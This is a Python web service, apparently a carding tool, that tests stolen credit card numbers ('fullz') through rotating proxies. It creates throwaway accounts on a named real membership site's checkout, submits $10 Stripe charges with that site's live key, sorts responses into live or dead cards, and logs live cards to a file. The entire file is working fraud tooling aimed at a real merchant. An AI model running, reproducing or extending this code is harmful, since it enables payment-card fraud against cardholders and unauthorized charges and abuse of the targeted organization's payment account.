import asyncio
import random
import time
import json
import os
import pathlib
from aiohttp import web
import httpx
from html import unescape
from bs4 import BeautifulSoup


def load_proxies_from_file(filename="proxy.txt"):
    proxies = []
    try:
        with open(filename, "r", encoding="utf-8") as f:
            for line in f:
                line = line.strip()
                if not line or line.startswith("#"):
                    continue
                parts = line.split(":")
                if len(parts) == 4:
                    ip, port, user, password = parts
                    proxy_url = f"http://{user}:{password}@{ip}:{port}"
                    proxies.append(proxy_url)
                else:
                    print(f"Proxy format error (harus ip:port:user:pass): {line}")
    except FileNotFoundError:
        print(f"File {filename} tidak ditemukan.")
    return proxies


def gets(s, start, end):
    try:
        start_index = s.index(start) + len(start)
        end_index = s.index(end, start_index)
        return s[start_index:end_index]
    except ValueError:
        return None


def map_error_message(result: str) -> str:
    lower_result = result.lower()

    # Daftar error yang masuk kategori LIVE dengan tanda ❎
    live_errors = [
        'insufficient funds',
        'your card has insufficient funds.',
        'your card does not support this type of purchase.',
        'ccn live',
        'transaction not allowed',
        'three_d_secure_redirect',
        'card_error_authentication_required',
        '3d challenge required',
        'invalid cvc',
    ]

    if 'that username is already taken' in lower_result:
        return 'Username Already Taken ❌'

    for err in live_errors:
        if err in lower_result:
            if 'invalid cvc' in lower_result:
                return "Invalid CVC ❎"
            if 'insufficient funds' in lower_result or 'your card has insufficient funds.' in lower_result:
                return "Insufficient Funds ❎"
            if 'your card does not support this type of purchase.' in lower_result:
                return "Card does not support this type of purchase ❎"
            return result + " ❎"

    # Error mappings selain kategori LIVE (kanan 🚫)
    error_mappings = {
        'incorrect_cvc': 'CCN Live ❎',  # dianggap live juga
        'generic_decline': 'Generic Declined 🚫',
        'do not honor': 'Do Not Honor 🚫',
        'fraudulent': 'Fraudulent 🚫',
        'setup_intent_authentication_failure': 'Setup Intent Authentication Failure 🚫',
        'stolen card': 'Stolen Card 🚫',
        'lost_card': 'Lost Card 🚫',
        'pickup_card': 'Pickup Card 🚫',
        'incorrect_number': 'Incorrect Card Number 🚫',
        'expired_card': 'Expired Card 🚫',
        'captcha required': 'Captcha Required 🚫',
        'invalid expiry year': 'Expiration Year Invalid 🚫',
        'invalid expiry month': 'Expiration Month Invalid 🚫',
        'invalid account': 'Dead card 🚫',
        'invalid api key provided': 'Stripe api key invalid 🚫',
        'testmode_charges_only': 'Stripe testmode charges only 🚫',
        'api_key_expired': 'Stripe api key expired 🚫',
        'your account cannot currently make live charges.': 'Stripe account cannot currently make live charges 🚫',
        'your card was declined.': 'Your card was declined 🚫',
    }

    for key, val in error_mappings.items():
        if key in lower_result:
            return val

    return result


async def create_payment_method(fullz, session):
    try:
        cc, mes, ano, cvv = fullz.split("|")

        # FORMAT dan VALIDASI MASA BERLAKU KARTU
        # Pastikan bulan selalu dua digit, tambahkan leading zero jika perlu
        mes = mes.zfill(2)

        # Jika tahun 4 digit, ambil 2 digit terakhir
        if len(ano) == 4:
            ano = ano[-2:]

        current_year = int(time.strftime("%y"))   # Tahun sekarang (2 digit)
        current_month = int(time.strftime("%m"))  # Bulan sekarang (2 digit)

        # Validasi bulan expiry
        try:
            expiry_month = int(mes)
        except ValueError:
            return {"html": "", "paid": False, "error": "Expiration Month Invalid"}

        if expiry_month < 1 or expiry_month > 12:
            return {"html": "", "paid": False, "error": "Expiration Month Invalid"}

        # Validasi tahun expiry
        try:
            expiry_year = int(ano)
        except ValueError:
            return {"html": "", "paid": False, "error": "Expiration Year Invalid"}

        if expiry_year < current_year:
            return {"html": "", "paid": False, "error": "Expiration Year Invalid 🚫"}
        elif expiry_year == current_year and expiry_month < current_month:
            return {"html": "", "paid": False, "error": "Expiration Month Invalid 🚫"}

        # ==== Lanjutan kode asli, tanpa perubahan ====
        user = "paraelna" + str(random.randint(9999, 574545))
        mail = "paraelna" + str(random.randint(9999, 574545)) + "@gmail.com"
        pwd = "paraelna" + str(random.randint(9999, 574545))

        headers = {
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'Accept-Language': 'en-US,en;q=0.9',
            'Cache-Control': 'max-age=0',
            'Connection': 'keep-alive',
            'Referer': 'https://foiwa.org.au/membership-account/membership-checkout/?level=4',
            'Sec-Fetch-Dest': 'document',
            'Sec-Fetch-Mode': 'navigate',
            'Sec-Fetch-Site': 'same-origin',
            'Sec-Fetch-User': '?1',
            'Upgrade-Insecure-Requests': '1',
            'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36',
            'sec-ch-ua': '"Not)A;Brand";v="8", "Chromium";v="138"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Linux"',
        }

        params = {
            'level': '4',
        }

        response = await session.get(
            'https://foiwa.org.au/membership-account/membership-checkout/',
            params=params,
            headers=headers,
        )

        nonce = gets(response.text, '<input type="hidden" id="pmpro_checkout_nonce" name="pmpro_checkout_nonce" value="', '" />')
        acc = gets(response.text, '"user_id":"', '",')

        if not nonce or not acc:
            return {"html": response.text, "paid": False, "error": "Failed to get nonce or account id"}

        stripe_headers = {
            'accept': 'application/json',
            'accept-language': 'en-US,en;q=0.9',
            'content-type': 'application/x-www-form-urlencoded',
            'origin': 'https://js.stripe.com',
            'priority': 'u=1, i',
            'referer': 'https://js.stripe.com/',
            'sec-ch-ua': '"Not)A;Brand";v="8", "Chromium";v="138"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Linux"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-site',
            'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36',
        }

        data = {
            'type':'card',
            'billing_details[address][line1]':'New York Ave',
            'billing_details[address][city]':'LONDON',
            'billing_details[address][state]':'New York',
            'billing_details[address][postal_code]':'11706',
            'billing_details[address][country]':'US',
            'billing_details[name]': user,
            'card[number]': cc,
            'card[cvc]': cvv,
            'card[exp_month]': mes,
            'card[exp_year]': ano,
            'guid':'c86aab9e-ba91-45c5-86be-47f401f09f328f25f6',
            'muid':'b45ea179-af41-4819-8d99-685a1726aeb8dd90f1',
            'sid':'596f6869-3cf4-4fed-a848-70df732309ca0c5fd7',
            'payment_user_agent':'stripe.js/54a85a778c; stripe-js-v3/54a85a778c; split-card-element',
            'referrer':'https://foiwa.org.au',
            'time_on_page':'419830',
            'client_attribution_metadata[client_session_id]':'67fa219f-62a2-4a68-a86b-ef37392885f9',
            'client_attribution_metadata[merchant_integration_source]':'elements',
            'client_attribution_metadata[merchant_integration_subtype]':'card-element',
            'client_attribution_metadata[merchant_integration_version]':'2017',
            'key':'pk_live_1a4WfCRJEoV9QNmww9ovjaR2Drltj9JA3tJEWTBi4Ixmr8t3q5nDIANah1o0SdutQx4lUQykrh9bi3t4dR186AR8P00KY9kjRvX',
            '_stripe_account': acc,
        }

        pm_response = await session.post(
            'https://api.stripe.com/v1/payment_methods',
            headers=stripe_headers,
            data=data,
        )

        pm_json = pm_response.json()
        pm_id = pm_json.get('id')
        if not pm_id:
            return {"html": pm_response.text, "paid": False, "error": "Failed to create payment method"}

        brand = pm_json.get('card', {}).get('brand', '')
        last4 = pm_json.get('card', {}).get('last4', '')

        headers = {
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.9',
            'Cache-Control': 'max-age=0',
            'Connection': 'keep-alive',
            'Content-Type': 'application/x-www-form-urlencoded',
            'Origin': 'https://foiwa.org.au',
            'Referer': 'https://foiwa.org.au/membership-account/membership-checkout/?level=4',
            'Sec-Fetch-Dest': 'document',
            'Sec-Fetch-Mode': 'navigate',
            'Sec-Fetch-Site': 'same-origin',
            'Sec-Fetch-User': '?1',
            'Upgrade-Insecure-Requests': '1',
            'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36',
            'sec-ch-ua': '"Not)A;Brand";v="8", "Chromium";v="138"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Linux"',
        }

        params = {
            'level': '4',
        }

        data = {
            'pmpro_level': '4',
            'checkjavascript': '1',
            'username': user,
            'password': pwd,
            'password2': pwd,
            'first_name': user,
            'last_name': user,
            'bemail': mail,
            'bconfirmemail': mail,
            'fullname': '',
            'donation_dropdown': '10',
            'donation': '',
            'bfirstname': user,
            'blastname': user,
            'baddress1': 'New York Ave',
            'baddress2': '',
            'bcity': 'LONDON',
            'bstate': 'New York',
            'bzipcode': '11706',
            'bcountry': 'US',
            'bphone': '2129532064',
            'CardType': brand,
            'pmpro_checkout_nonce': nonce,
            '_wp_http_referer': '/membership-account/membership-checkout/?level=4',
            'submit-checkout': '1',
            'javascriptok': '1',
            'payment_method_id': pm_id,
            'AccountNumber': last4,
            'ExpirationMonth': mes,
            'ExpirationYear': ano,
        }

        response = await session.post(
            'https://foiwa.org.au/membership-account/membership-checkout/',
            params=params,
            headers=headers,
            data=data,
            follow_redirects=True
        )

        html_text = response.text
        soup = BeautifulSoup(html_text, 'html.parser')
        paid_tag = soup.find("span", class_="pmpro_list_item_value pmpro_tag pmpro_tag-success")

        status_paid = False
        if paid_tag and paid_tag.text.strip().lower() == "paid":
            status_paid = True

        return {"html": html_text, "paid": status_paid}

    except Exception as e:
        return {"html": "", "paid": False, "error": str(e)}


async def charge_resp(result):
    try:
        if isinstance(result, dict):
            if result.get("paid"):
                return "Charged 10$ 🔥"
            else:
                if result.get("error"):
                    return map_error_message(result.get("error"))
                return "Payment has not been received ❌"

        result_str = result if isinstance(result, str) else str(result)

        mapped = map_error_message(result_str)
        if mapped != result_str:
            return mapped

        if '{"status":"SUCCEEDED",' in result_str or '"status":"succeeded"' in result_str:
            return "Charged 10$ 🔥"

        return result_str + " 🚫"

    except Exception as e:
        return f"{str(e)} 🚫"


async def multi_checking(fullz, proxies):
    start = time.time()
    if not proxies:
        return "No proxies loaded."

    proxy = random.choice(proxies)

    async with httpx.AsyncClient(timeout=40, proxy=proxy) as session:
        result = await create_payment_method(fullz, session)
        response = await charge_resp(result)
    elapsed = round(time.time() - start, 2)

    error_message = ""
    try:
        html_content = result["html"] if isinstance(result, dict) else result
        json_resp = json.loads(html_content)
        if "error" in json_resp:
            error_message = unescape(json_resp["error"].get("message", "")).strip()
    except Exception:
        try:
            soup = BeautifulSoup(result["html"] if isinstance(result, dict) else result, 'html.parser')
            error_div = soup.find('div', {'id': 'pmpro_message_bottom'})
            if error_div:
                error_message = error_div.get_text(strip=True)
        except Exception:
            pass

    if error_message:
        mapped_error = map_error_message(error_message)
        # Tandai ❎ jika bukan sudah termasuk di mapped_error
        if "❎" not in mapped_error and "🔥" not in mapped_error and "🚫" not in mapped_error:
            mapped_error += " ❎"
        return f"{fullz} {mapped_error} {elapsed}s"

    resp = f"{fullz} {response} {elapsed}s"

    if any(keyword in response for keyword in ["Charged 10$ 🔥", "CCN Live ❎", "CVV LIVE ❎", "Insufficient Funds ❎", "Card does not support this type of purchase ❎", "Transaction not allowed ❎", "3D Challenge Required ❎", "Invalid CVC ❎"]):
        with open("charge.txt", "a", encoding="utf-8") as file:
            file.write(resp + "\n")

    return resp


async def check_card(request):
    try:
        data = await request.json()
    except Exception:
        return web.json_response({"error": "Invalid JSON body"}, status=400)

    cc = data.get("cc")
    if not cc:
        return web.json_response({"error": "Missing 'cc' field"}, status=400)

    proxies = request.app.get("proxies", [])

    try:
        result = await multi_checking(cc, proxies)
        return web.json_response({"result": result})
    except Exception as e:
        return web.json_response({"error": str(e)}, status=500)


async def index(request):
    path = pathlib.Path(__file__).parent / "index.html"
    return web.FileResponse(path)


async def init_app():
    app = web.Application()
    app["proxies"] = load_proxies_from_file("proxy.txt")
    app.router.add_get("/", index)
    app.router.add_post("/check-card", check_card)
    return app


if __name__ == "__main__":
    app = asyncio.run(init_app())
    port = int(os.getenv("PORT", 8080))
    web.run_app(app, host="0.0.0.0", port=port)
